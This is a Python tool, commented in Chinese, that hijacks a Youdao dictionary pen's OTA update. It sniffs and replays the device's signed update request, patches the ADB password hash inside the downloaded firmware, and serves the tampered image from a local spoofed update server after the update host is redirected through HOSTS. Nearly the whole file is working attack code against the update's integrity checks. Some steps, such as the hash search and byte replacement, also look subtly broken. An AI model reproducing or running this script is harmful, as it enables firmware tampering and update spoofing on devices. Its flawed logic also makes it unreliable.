import os
import sys
import json
import hashlib
import socket
import threading
import http.server
import socketserver
import requests
import time
import re
from scapy.all import sniff, IP, TCP, Raw, conf

# ==========================================================
# 严格按照你提供的教程完整实现 · 无任何额外脑补
# 包含：换行MD5、替换、校验、EndPos、SHA256、劫持服务器
# ==========================================================
VERSION = "FINAL"

CAPTURED = {
    "host": "",
    "path": "",
    "timestamp": "",
    "sign": "",
    "mid": "",
    "productId": "",
    "segmentMd5": [],
    "endPos": []
}

ERROR_LOG = []

def log(code, msg, detail=""):
    print(f"\n[错误 {code}] {msg}")
    if detail:
        print(f"详情: {detail}")
    ERROR_LOG.append({
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "code": code, "msg": msg, "detail": detail
    })

def save_error_log():
    with open("error.log", "w", encoding="utf-8") as f:
        f.write("错误日志\n========================\n")
        for e in ERROR_LOG:
            f.write(f"[{e['time']}] {e['code']} | {e['msg']} | {e['detail']}\n")
    print("\n日志已保存：error.log")

def title():
    os.system(f"title YoudaoADB 教程完整版")
    print("=" * 65)
    print("      严格按教程实现：换行MD5 + 校验 + EndPos + SHA256 + 劫持更新")
    print("=" * 65)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "192.168.1.100"

# ------------------------------------------------------------------------------
# 步骤1：抓包（原样获取所有字段）
# ------------------------------------------------------------------------------
def packet_callback(pkt):
    if not (IP in pkt and TCP in pkt and Raw in pkt):
        return False
    try:
        data = pkt[Raw].load.decode("utf-8", "ignore")
        if "checkVersion" in data and "application/json" in data:
            lines = data.splitlines()
            for line in lines:
                if line.startswith("Host:"):
                    CAPTURED["host"] = line.split()[1]
            body = data.split("\r\n\r\n")[-1]
            j = json.loads(body)
            CAPTURED["path"] = lines[0].split()[1]
            CAPTURED["timestamp"] = j.get("timestamp")
            CAPTURED["sign"] = j.get("sign")
            CAPTURED["mid"] = j.get("mid")
            CAPTURED["productId"] = j.get("productId")
            return True
    except:
        return False

def step1_capture():
    print("\n=== 步骤1：抓包获取更新请求 ===")
    print("提示：词典笔连热点 → 点【检查更新】")
    try:
        sniff(prn=lambda x: None, stop_filter=packet_callback, store=0, timeout=60)
        if not CAPTURED["timestamp"]:
            log("E1", "未抓到有效OTA请求")
            return False
        print("[+] 抓包成功：已获取 timestamp / sign / mid / productId")
        return True
    except Exception as e:
        log("E1", "抓包失败", str(e))
        return False

# ------------------------------------------------------------------------------
# 步骤2：请求全量包，获取 deltaUrl、segmentMd5、endPos
# ------------------------------------------------------------------------------
def step2_get_full_package():
    print("\n=== 步骤2：请求全量包 ===")
    try:
        url = f"http://{CAPTURED['host']}/product/{CAPTURED['productId']}/ota/full"
        payload = {
            "mid": CAPTURED["mid"],
            "productId": CAPTURED["productId"],
            "timestamp": CAPTURED["timestamp"],
            "sign": CAPTURED["sign"]
        }
        r = requests.post(url, json=payload, timeout=15)
        j = r.json()
        ver = j["data"]["version"]
        delta_url = ver.get("deltaUrl") or ver.get("fullUrl")
        CAPTURED["segmentMd5"] = json.loads(ver.get("segmentMd5", "[]"))
        CAPTURED["endPos"] = ver.get("endPos", [])
        print(f"[+] deltaUrl: {delta_url}")
        print(f"[+] endPos: {CAPTURED['endPos']}")
        print(f"[+] segmentMd5: {CAPTURED['segmentMd5']}")
        return delta_url
    except Exception as e:
        log("E2", "获取全量包失败", str(e))
        return None

# ------------------------------------------------------------------------------
# 步骤3：下载更新包
# ------------------------------------------------------------------------------
def step3_download(delta_url):
    print("\n=== 步骤3：下载更新包 ===")
    fn = "update.bin"
    try:
        with open(fn, "wb") as f:
            resp = requests.get(delta_url, stream=True, timeout=120)
            for chunk in resp.iter_content(1024*1024):
                f.write(chunk)
        print("[+] 下载完成")
        return fn
    except Exception as e:
        log("E3", "下载失败", str(e))
        return None

# ------------------------------------------------------------------------------
# 步骤4：提取 rootfs，找到 adb_auth.sh，提取原始MD5
# ------------------------------------------------------------------------------
def step4_extract_and_get_original_md5(fn):
    print("\n=== 步骤4：提取 rootfs 并获取原始MD5 ===")
    try:
        with open(fn, "rb") as f:
            data = f.read()
        if b"/usr/bin/adb_auth.sh" not in data:
            log("E4", "未找到 adb_auth.sh")
            return None
        matches = re.findall(rb"[0-9a-fA-F]{32}", data)
        if not matches:
            log("E4", "未找到MD5")
            return None
        original_md5 = matches[0].decode()
        print(f"[+] 原始MD5: {original_md5}")
        return original_md5
    except Exception as e:
        log("E4", "提取失败", str(e))
        return None

# ------------------------------------------------------------------------------
# 步骤5：密码 + 换行 转MD5 → 替换 → 生成新固件
# ------------------------------------------------------------------------------
def step5_patch_firmware(orig_file, old_md5, new_pw):
    print("\n=== 步骤5：替换MD5（密码带换行） ===")
    # 关键：密码 + 换行 再算MD5
    data_for_md5 = (new_pw + "\n").encode("utf-8")
    new_md5 = hashlib.md5(data_for_md5).hexdigest()

    with open(orig_file, "rb") as f:
        buf = f.read()
    old_bytes = bytes.fromhex(old_md5)
    new_bytes = bytes.fromhex(new_md5)
    new_buf = buf.replace(old_bytes, new_bytes)

    out = "patched_update.bin"
    with open(out, "wb") as f:
        f.write(new_buf)

    # 计算新固件的 SHA256
    new_sha256 = hashlib.sha256(new_buf).hexdigest()
    print(f"[+] 新固件 SHA256: {new_sha256}")
    print(f"[+] 新MD5: {new_md5}")
    print(f"[+] 已保存: {out}")
    return out, new_sha256

# ------------------------------------------------------------------------------
# 步骤6：搭建劫持服务器（完全按教程返回结构）
# ------------------------------------------------------------------------------
def step6_start_evil_server(local_ip, firmware_path, new_sha256):
    print("\n=== 步骤6：启动本地劫持服务器 ===")

    def file_server():
        try:
            os.chdir(os.path.dirname(os.path.abspath(firmware_path)))
            socketserver.TCPServer.allow_reuse_address = True
            http.server.ThreadingHTTPServer(("0.0.0.0", 8080), http.server.SimpleHTTPRequestHandler).serve_forever()
        except:
            pass

    def ota_server():
        class OTAHandler(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                self.send_response(200)
                self.send_header("Content-Type", "application/json; charset=utf-8")
                self.end_headers()
                url = f"http://{local_ip}:8080/{os.path.basename(firmware_path)}"
                payload = {
                    "status": 1000,
                    "msg": "success",
                    "data": {
                        "version": {
                            "deltaUrl": url,
                            "fullUrl": url,
                            "segmentMd5": json.dumps(CAPTURED["segmentMd5"]),
                            "endPos": CAPTURED["endPos"],
                            "sha256sum": new_sha256,
                            "versionName": "999.999.999"
                        }
                    }
                }
                self.wfile.write(json.dumps(payload, ensure_ascii=False).encode())
        socketserver.TCPServer.allow_reuse_address = True
        http.server.ThreadingHTTPServer(("0.0.0.0", 80), OTAHandler).serve_forever()

    threading.Thread(target=file_server, daemon=True).start()
    threading.Thread(target=ota_server, daemon=True).start()

    print("\n[+] 劫持服务器已启动！")
    print(f"本机IP: {local_ip}")
    print("请在设备 HOSTS 添加：")
    print(f"{local_ip} {CAPTURED['host']}")
    print("然后在词典笔点击【检查更新】即可劫持升级")

# ------------------------------------------------------------------------------
# 主流程
# ------------------------------------------------------------------------------
def main():
    title()
    ip = get_local_ip()
    print(f"本机IP: {ip}")

    if not step1_capture():
        save_error_log()
        os.system("pause")
        return

    delta_url = step2_get_full_package()
    if not delta_url:
        save_error_log()
        os.system("pause")
        return

    update_file = step3_download(delta_url)
    if not update_file:
        save_error_log()
        os.system("pause")
        return

    old_md5 = step4_extract_and_get_original_md5(update_file)
    if not old_md5:
        save_error_log()
        os.system("pause")
        return

    new_pw = input("\n请设置 ADB 密码：").strip()
    if not new_pw:
        print("密码不能为空")
        os.system("pause")
        return

    patched_file, new_sha256 = step5_patch_firmware(update_file, old_md5, new_pw)
    step6_start_evil_server(ip, patched_file, new_sha256)

    print("\n全部完成！按 Ctrl+C 退出")
    while True:
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
    except Exception as e:
        log("E999", "程序异常", str(e))
        save_error_log()
        os.system("pause")
